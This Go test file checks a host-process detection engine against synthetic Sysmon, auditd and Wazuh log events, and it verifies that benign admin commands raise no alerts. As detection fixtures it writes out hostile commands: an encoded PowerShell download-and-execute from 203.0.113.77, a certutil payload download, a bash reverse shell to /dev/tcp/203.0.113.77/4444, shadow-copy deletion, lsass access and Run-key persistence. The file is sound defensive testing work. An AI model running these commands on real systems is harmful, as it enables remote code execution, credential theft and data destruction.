package detect

import (
	"encoding/base64"
	"strings"
	"testing"
	"unicode/utf16"

	"netsa/internal/model"
	"netsa/internal/parser"
)

func procHits(t *testing.T, line string) []model.Hit {
	t.Helper()
	a, _ := parser.NewAuto("auto", "")
	ev, ok := a.Parse(line)
	if !ok {
		t.Fatalf("无法解析: %s", line)
	}
	if ev.Kind != model.KindProcess {
		t.Fatalf("应解析为进程事件: %+v", ev)
	}
	e, _ := NewEngine("", 0)
	return e.Inspect(ev)
}

func hasRule(hits []model.Hit, id string) *model.Hit {
	for i := range hits {
		if hits[i].RuleID == id {
			return &hits[i]
		}
	}
	return nil
}

func psEncode(s string) string {
	u := utf16.Encode([]rune(s))
	b := make([]byte, 2*len(u))
	for i, c := range u {
		b[2*i], b[2*i+1] = byte(c), byte(c>>8)
	}
	return base64.StdEncoding.EncodeToString(b)
}

// 主机进程检测：Web 进程启动命令解释器、编码的 PowerShell 下载执行、LOLBin、lsass 访问、持久化、反弹 Shell、
// 删除卷影副本；正常的管理操作不告警。
func TestProcessDetection(t *testing.T) {
	sysmon := func(id int, data string) string {
		return `{"@timestamp":"2026-11-01T02:00:00Z","host":{"ip":["10.0.0.10","fe80::1"],"name":"WEB01"},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational",` +
			`"computer_name":"WEB01.corp.local","event_id":` + itoa(id) + `,"event_data":{` + data + `}}}`
	}
	// IIS 工作进程启动 cmd：WebShell 已经执行
	hits := procHits(t, sysmon(1, `"Image":"C:\\Windows\\System32\\cmd.exe","CommandLine":"cmd.exe /c whoami","ParentImage":"C:\\Windows\\System32\\inetsrv\\w3wp.exe","User":"IIS APPPOOL\\DefaultAppPool"`))
	h := hasRule(hits, "proc-web-spawn")
	if h == nil || h.Severity != model.SevCritical || h.Category != CatHostExec || h.Result != model.ResultSuccess || !strings.Contains(h.Evidence, "web01.corp.local（10.0.0.10）") {
		t.Fatalf("w3wp 启动 cmd: %+v", hits)
	}
	// Tomcat（java + catalina）启动 bash
	hits = procHits(t, `{"process":{"executable":"/bin/bash","command_line":"bash -c id","parent":{"executable":"/usr/bin/java","command_line":"java -Dcatalina.base=/opt/tomcat org.apache.catalina.startup.Bootstrap start"}},"event":{"category":"process","type":"start"},"host":{"ip":"10.0.0.11","name":"app01"},"@timestamp":"2026-11-01T02:00:00Z"}`)
	if hasRule(hits, "proc-web-spawn") == nil {
		t.Fatalf("Tomcat 启动 bash: %+v", hits)
	}
	// 普通 Java 程序（非应用服务器）启动 sh 不告警
	hits = procHits(t, `{"process":{"executable":"/bin/sh","command_line":"sh -c ls","parent":{"executable":"/usr/bin/java","command_line":"java -jar build-agent.jar"}},"event":{"category":"process","type":"start"},"host":{"ip":"10.0.0.12"}}`)
	if len(hits) != 0 {
		t.Fatalf("构建工具调用 sh 不告警: %+v", hits)
	}
	// 编码的 PowerShell 下载执行
	enc := psEncode("IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.77/a.ps1')")
	hits = procHits(t, sysmon(1, `"Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell.exe -nop -w hidden -enc `+enc+`","ParentImage":"C:\\Windows\\explorer.exe"`))
	h = hasRule(hits, "proc-ps-encoded")
	if h == nil || h.Severity != model.SevCritical || !strings.Contains(h.Evidence, "DownloadString('http://203.0.113.77/a.ps1')") {
		t.Fatalf("编码的 PowerShell: %+v", hits)
	}
	// certutil 下载、lsass 访问、Run 键、删除卷影副本
	if hits = procHits(t, sysmon(1, `"Image":"C:\\Windows\\System32\\certutil.exe","CommandLine":"certutil -urlcache -split -f http://203.0.113.77/x.exe C:\\Users\\Public\\x.exe","ParentImage":"C:\\Windows\\System32\\cmd.exe"`)); hasRule(hits, "proc-certutil") == nil {
		t.Fatalf("certutil 下载: %+v", hits)
	}
	if hits = procHits(t, sysmon(10, `"SourceImage":"C:\\Users\\Public\\p.exe","TargetImage":"C:\\Windows\\system32\\lsass.exe","GrantedAccess":"0x1010"`)); hasRule(hits, "proc-lsass-access") == nil {
		t.Fatalf("访问 lsass: %+v", hits)
	}
	if hits = procHits(t, sysmon(10, `"SourceImage":"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\MsMpEng.exe","TargetImage":"C:\\Windows\\system32\\lsass.exe","GrantedAccess":"0x1410"`)); len(hits) != 0 {
		t.Fatalf("安全软件访问 lsass 不告警: %+v", hits)
	}
	if hits = procHits(t, sysmon(13, `"Image":"C:\\Users\\Public\\x.exe","TargetObject":"HKU\\S-1-5-21\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\upd","Details":"C:\\Users\\Public\\x.exe"`)); hasRule(hits, "proc-runkey") == nil {
		t.Fatalf("Run 键: %+v", hits)
	}
	if hits = procHits(t, sysmon(1, `"Image":"C:\\Windows\\System32\\vssadmin.exe","CommandLine":"vssadmin.exe Delete Shadows /All /Quiet","ParentImage":"C:\\Windows\\System32\\cmd.exe"`)); hasRule(hits, "proc-shadow-delete") == nil ||
		hasRule(hits, "proc-shadow-delete").Phase != model.PhaseImpact {
		t.Fatalf("删除卷影副本: %+v", hits)
	}
	// Web 服务进程写入脚本文件
	if hits = procHits(t, sysmon(11, `"Image":"C:\\Windows\\System32\\inetsrv\\w3wp.exe","TargetFilename":"C:\\inetpub\\wwwroot\\upload\\x.aspx"`)); hasRule(hits, "proc-webshell-drop") == nil {
		t.Fatalf("WebShell 落地: %+v", hits)
	}
	// 正常的管理命令
	for _, cmd := range []string{"ipconfig /all", "schtasks /query /fo LIST", "net user zhangsan", "powershell.exe -File C:\\scripts\\backup.ps1"} {
		img := strings.Fields(cmd)[0]
		if hits = procHits(t, sysmon(1, `"Image":"C:\\Windows\\System32\\`+img+`","CommandLine":"`+strings.ReplaceAll(cmd, `\`, `\\`)+`","ParentImage":"C:\\Windows\\explorer.exe"`)); len(hits) != 0 {
			t.Fatalf("正常命令 %q 不告警: %+v", cmd, hits)
		}
	}

	// auditd：www-data 执行的反弹 Shell（参数以十六进制记录）
	a, _ := parser.NewAuto("auto", "")
	a.Parse(`node=web02 type=SYSCALL msg=audit(1730000000.100:500): arch=c000003e syscall=59 success=yes exit=0 ppid=812 pid=900 auid=4294967295 uid=33 gid=33 comm="bash" exe="/usr/bin/bash" key="exec"` + "\x1d" + `AUID="unset" UID="www-data" GID="www-data"`)
	ev, ok := a.Parse(`node=web02 type=EXECVE msg=audit(1730000000.100:500): argc=3 a0="bash" a1="-c" a2=` + hexOf("bash -i >& /dev/tcp/203.0.113.77/4444 0>&1"))
	if !ok || ev.Proc == nil || ev.Proc.User != "www-data" || ev.Proc.Image != "/usr/bin/bash" || ev.Host != "web02" {
		t.Fatalf("auditd: %+v %+v", ev, ev.Proc)
	}
	e, _ := NewEngine("", 0)
	hits = e.Inspect(ev)
	if hasRule(hits, "proc-revshell") == nil || hasRule(hits, "proc-web-spawn") == nil {
		t.Fatalf("auditd 反弹 Shell: %+v", hits)
	}

	// Wazuh 告警：按等级与 MITRE 归类；网络来源的告警以来源为攻击者
	w := `{"timestamp":"2026-11-01T02:00:00.000+0800","rule":{"level":10,"description":"sshd: brute force trying to get access to the system.","id":"5712",` +
		`"mitre":{"id":["T1110"],"tactic":["Credential Access"]},"groups":["sshd"]},"agent":{"id":"001","name":"web02","ip":"10.0.0.20"},"data":{"srcip":"45.33.1.2"},"full_log":"Failed password for root"}`
	ev, ok = a.Parse(w)
	if !ok || ev.Kind != model.KindProcess || ev.SrcIP != "45.33.1.2" || ev.DstIP != "10.0.0.20" || ev.SubjectHost {
		t.Fatalf("Wazuh 网络来源告警: %+v", ev)
	}
	hits = e.Inspect(ev)
	if len(hits) != 1 || hits[0].Category != CatBruteForce || hits[0].Severity != model.SevHigh || !strings.Contains(hits[0].Evidence, "T1110") {
		t.Fatalf("Wazuh 告警: %+v", hits)
	}
	low := strings.Replace(strings.Replace(w, `"level":10`, `"level":3`, 1), `"srcip":"45.33.1.2"`, `"x":"y"`, 1)
	if ev, _ = a.Parse(low); len(e.Inspect(ev)) != 0 {
		t.Fatal("低等级的 Wazuh 告警不产生命中")
	}
}

func hexOf(s string) string {
	const d = "0123456789ABCDEF"
	b := make([]byte, 0, 2*len(s))
	for i := 0; i < len(s); i++ {
		b = append(b, d[s[i]>>4], d[s[i]&15])
	}
	return string(b)
}

// 命令行中有转小写后字节长度会变化的字符（如土耳其语的 İ）时，编码参数照样解码，不会越界。
func TestEncodedPSUnicode(t *testing.T) {
	enc := psEncode("IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.77/a')")
	ev := &model.Event{Kind: model.KindProcess, SrcIP: "10.0.0.12", SubjectHost: true, Proc: &model.ProcInfo{Op: "process",
		Image: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, CommandLine: "powershell.exe -w İİİİ hidden -EncodedCommand " + enc}}
	e, _ := NewEngine("", 0)
	h := hasRule(e.Inspect(ev), "proc-ps-encoded")
	if h == nil || h.Severity != model.SevCritical || !strings.Contains(h.Evidence, "DownloadString") {
		t.Fatalf("含多字节字符的命令行: %+v", h)
	}
}
